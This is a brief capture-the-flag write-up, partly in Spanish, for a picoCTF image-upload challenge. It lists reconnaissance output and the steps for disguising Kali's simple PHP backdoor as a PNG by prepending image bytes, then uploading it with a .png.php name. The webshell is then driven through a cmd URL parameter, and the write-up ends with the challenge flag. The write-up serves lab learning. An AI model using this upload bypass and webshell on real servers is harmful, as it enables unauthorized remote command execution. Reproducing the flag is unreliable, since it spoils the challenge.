## Introducción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Descripción
activar instancia
Entrar al link
```
┌──(kali㉿kali)-[~]
└─$ whatweb http://atlas.picoctf.net:53111/
http://atlas.picoctf.net:53111/ [200 OK] Apache[2.4.56], Country[UNITED STATES][US], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[18.217.83.136], PHP[8.0.30], Title[File Upload Page], X-Powered-By[PHP/8.0.30]
                                                                  
```

## Comandos

locate webshells/php
cp  /usr/share/webshells/php/simple-backdoor.php webshells.php

nano webshells.php = se le agrega PNG al principio
se sube el archivo
instalar lista de palabras
sudo apt install wordlist


http://atlas.picoctf.net:52606/uploads/webshellssss.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null

## Solución 
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
